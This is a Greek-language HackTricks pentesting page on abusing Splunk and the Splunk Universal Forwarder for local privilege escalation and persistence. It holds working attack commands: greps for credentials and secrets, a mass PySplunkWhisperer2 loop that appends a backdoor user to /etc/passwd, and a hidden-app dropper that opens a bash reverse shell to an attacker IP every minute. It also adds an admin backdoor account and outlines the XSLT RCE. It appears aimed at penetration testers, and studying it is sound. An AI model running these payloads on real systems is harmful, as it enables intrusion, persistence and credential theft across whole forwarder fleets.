# Splunk LPE και Persistence

{{#include ../../banners/hacktricks-training.md}}

Αν κατά την **enumerating** ενός machine **internally** ή **externally** εντοπίσετε το **Splunk running** (συνήθως στη **8000** για το web UI και στη **8089** για το management API), τα valid credentials μπορούν συχνά να μετατραπούν σε **code execution** μέσω app installation, scripted inputs ή management actions. Αν το Splunk εκτελείται ως **root**, αυτό συχνά οδηγεί άμεσα σε **privilege escalation**.

Αν χρειάζεστε μόνο το generic remote attack surface, enumeration ή το app-upload RCE path, ελέγξτε:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Αν είστε **already root** και το Splunk service δεν ακούει μόνο στο localhost, μπορείτε επίσης να κλέψετε **Splunk password hashes**, να ανακτήσετε **encrypted secrets** ή να προωθήσετε ένα **malicious app** για να διατηρήσετε persistence τοπικά ή σε πολλαπλούς forwarders.

## Ενδιαφέροντα Local Files

Όταν αποκτήσετε πρόσβαση σε host που εκτελεί Splunk ή Splunk Universal Forwarder, αυτές είναι συνήθως οι πιο ενδιαφέρουσες paths:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Σημαντικά artifacts:

- **`$SPLUNK_HOME/etc/passwd`**: local Splunk users και password hashes.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: key που χρησιμοποιείται από το Splunk για την κρυπτογράφηση secrets που αποθηκεύονται σε διάφορα αρχεία `.conf`.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: αρχικό admin bootstrap file· χρήσιμο σε gold images και provisioning mistakes. Αγνοείται αν υπάρχει ήδη το `etc/passwd`.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: όπου συνήθως ενεργοποιούνται scripted inputs.
- **`$SPLUNK_HOME/etc/deployment-apps/`** ή **`$SPLUNK_HOME/etc/apps/`**: κατάλληλα σημεία για απόκρυψη ενός persistent app ή για έλεγχο του τι διανέμεται ήδη.

## Σύνοψη Exploit του Splunk Universal Forwarder Agent

Για περισσότερες λεπτομέρειες, δείτε [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Αυτή είναι απλώς μια σύνοψη:

**Επισκόπηση exploit:**
Ένα exploit που στοχεύει το Splunk Universal Forwarder (UF) επιτρέπει σε attackers με το **agent password** να εκτελούν arbitrary code σε συστήματα όπου εκτελείται ο agent, θέτοντας ενδεχομένως σε κίνδυνο μεγάλο μέρος του environment.

**Γιατί λειτουργεί:**

- Η management service του UF είναι συνήθως exposed στη **TCP 8089**.
- Οι attackers μπορούν να κάνουν authenticate στο API και να δώσουν εντολή στον forwarder να εγκαταστήσει ένα **malicious app bundle**.
- Το ίδιο primitive μπορεί να χρησιμοποιηθεί τοπικά για **LPE** ή απομακρυσμένα για **RCE**.
- Public tooling όπως το **SplunkWhisperer2** δημιουργεί αυτόματα το app bundle και μπορεί να προσαρμόσει τα payloads για Linux targets.

**Συνήθεις τρόποι ανάκτησης του password:**

- Cleartext credentials σε documentation, scripts, shares ή deployment automation.
- Password hashes μέσα στο `$SPLUNK_HOME/etc/passwd`, ακολουθούμενα από offline cracking.
- Golden images ή provisioning leftovers, όπως το `user-seed.conf`.

**Impact:**

- SYSTEM/root-level code execution σε κάθε compromised host.
- Deployment persistent apps, backdoors ή ransomware.
- Απενεργοποίηση ή tampering του telemetry πριν προωθηθούν τα δεδομένα.

**Παράδειγμα command για exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Χρήσιμα public exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence μέσω Scripted Inputs ή Malicious Apps

Αν έχετε **δικαιώματα εγγραφής στο filesystem** ως `root`/`splunk`, ή authenticated access για την εγκατάσταση apps, ένας πολύ αξιόπιστος μηχανισμός persistence είναι να τοποθετήσετε ένα **custom app** με ένα **scripted input**. Η τεκμηρίωση του Splunk αναμένει τα scripted inputs να βρίσκονται μέσα σε έναν κατάλογο app και να ενεργοποιούνται από το `inputs.conf`.

Τυπική διάταξη:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Ελάχιστο `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Γρήγορο Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Σημειώσεις:

- Το ίδιο trick λειτουργεί και στο **Universal Forwarder**, χρησιμοποιώντας το `/opt/splunkforwarder/etc/apps/`.
- Οι attackers συχνά αναμειγνύονται με το περιβάλλον τροποποιώντας ένα legitimate add-on αντί να δημιουργούν ένα προφανώς malicious app.
- Σε έναν **deployment server**, η τοποθέτηση ενός malicious app μέσα στο `deployment-apps/` μετατρέπεται σε **fleet-wide persistence**, επειδή οι forwarders κάνουν poll, κατεβάζουν updated apps και συχνά κάνουν restart για να τα εφαρμόσουν.

## Credential Theft και Admin Takeover

Αν μπορείτε να διαβάσετε τα local files του Splunk, συνήθως υπάρχουν δύο καλοί στόχοι: η ανάκτηση **Splunk admin access** και η ανάκτηση **encrypted service credentials**.

### Password hashes και local users

Το Splunk αποθηκεύει τα local authentication data στο `etc/passwd`. Ανάλογα με το deployment, το cracking αυτού του file μπορεί να ανακτήσει working credentials για το web UI και το management API.

Αν έχετε ήδη έγκυρα **admin** credentials και το Splunk χρησιμοποιεί το **native** authentication backend, το ίδιο το CLI μπορεί να χρησιμοποιηθεί για persistence:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` και encrypted values

Το Splunk χρησιμοποιεί το `etc/auth/splunk.secret` για την προστασία ευαίσθητων τιμών που αποθηκεύονται σε πολλά αρχεία ρυθμίσεων. Αν μπορέσετε να κλέψετε τόσο το **secret** όσο και τα σχετικά **`.conf` files**, συχνά μπορείτε να ανακτήσετε ή να επαναχρησιμοποιήσετε:

- shared secrets των forwarder/indexer, όπως το `pass4SymmKey`
- κωδικούς private keys TLS, όπως το `sslPassword`
- LDAP bind credentials, όπως το `bindDNPassword`

Αυτό είναι χρήσιμο για **lateral movement**, ακόμη και όταν το Splunk admin password δεν μπορεί να γίνει crack.

### Abuse του `user-seed.conf`

Το `user-seed.conf` χρησιμοποιείται μόνο κατά την πρώτη εκκίνηση ή όταν δεν υπάρχει το `etc/passwd`. Αυτό το καθιστά λιγότερο χρήσιμο σε ένα live box, αλλά ιδιαίτερα ενδιαφέρον σε:

- compromised installation templates
- container images
- unattended provisioning workflows
- appliances όπου το Splunk επανεκκινείται αυτόματα από την αρχή

Σε αυτές τις περιπτώσεις, η τοποθέτηση ενός `HASHED_PASSWORD` που δημιουργήθηκε με το `splunk hash-passwd` σας προσφέρει έναν αθόρυβο τρόπο να ανακτήσετε admin access μετά το redeployment.

## Abusing Splunk Queries

Για περισσότερες λεπτομέρειες, δείτε [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).

Μια χρήσιμη πρόσφατη τεχνική είναι η κατάχρηση **user-supplied XSLT** σε ευάλωτες εκδόσεις του Splunk Enterprise, ώστε ένας authenticated account με χαμηλά δικαιώματα να μετατραπεί σε **OS command execution** ως ο χρήστης `splunk`.

High-level flow:

1. Κάντε authenticate στο Splunk.
2. Κάντε upload ένα κακόβουλο **XSL** file μέσω της λειτουργικότητας preview/upload.
3. Κάντε το Splunk να κάνει render τα search results με το uploaded stylesheet από τον κατάλογο **dispatch**.
4. Χρησιμοποιήστε το XSLT payload για να γράψετε ένα file ή να ενεργοποιήσετε execution μέσω του Splunk search pipeline (για παράδειγμα, φτάνοντας σε internal functionality όπως το `runshellscript`).

Το σημαντικό offensive takeaway είναι ότι αυτό το path προσφέρει **post-auth RCE χωρίς να απαιτείται app upload**. Σε Linux συνήθως καταλήγετε στον λογαριασμό **`splunk`**, ο οποίος παραμένει πολύτιμος, επειδή αυτός ο χρήστης συχνά είναι owner του application tree, μπορεί να διαβάσει secrets και μπορεί να τοποθετήσει persistent apps που επιβιώνουν από την απώλεια του shell.

Ένα representative path που χρησιμοποιείται κατά το exploitation είναι:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Αν το Splunk εκτελείται με υπερβολικά πολλά δικαιώματα ή αν ο χρήστης `splunk` έχει πρόσβαση σε επικίνδυνα scripts, εγγράψιμα service units ή κακούς κανόνες `sudo`, αυτό δημιουργεί μια καθαρή αλυσίδα **LPE**.

## Αναφορές

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
